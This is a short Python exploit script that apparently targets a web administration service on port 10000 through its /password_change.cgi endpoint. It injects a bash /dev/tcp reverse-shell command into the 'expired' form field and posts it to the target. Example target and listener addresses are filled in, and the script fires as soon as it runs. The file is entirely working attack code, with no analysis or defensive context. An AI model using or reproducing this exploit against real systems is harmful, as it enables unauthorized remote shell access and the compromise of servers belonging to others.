import requests

def exploit(target, lhost, lport):
    vuln_path = "/password_change.cgi"
    exploit_target = (
        f"https://{target}:10000{vuln_path}"
    )
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.47',
        'Referer': f'https://{target}:10000/',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    payload = f"bash -c '0<&66-;exec 66<>/dev/tcp/{lhost}/{lport};sh <&66 >&66 2>&66'"
    data = {
        'expired': payload,
        'new1': 'SmKUYgMFtixFlLt6nggby'
    }
    requests.post(exploit_target, headers=headers, data=data, verify=False)
    print("Exploit script executed successfully.")
    exit()

# Example usage:
target = "192.168.1.14"
lhost = "192.168.1.72"
lport = "4443"

exploit(target, lhost, lport)
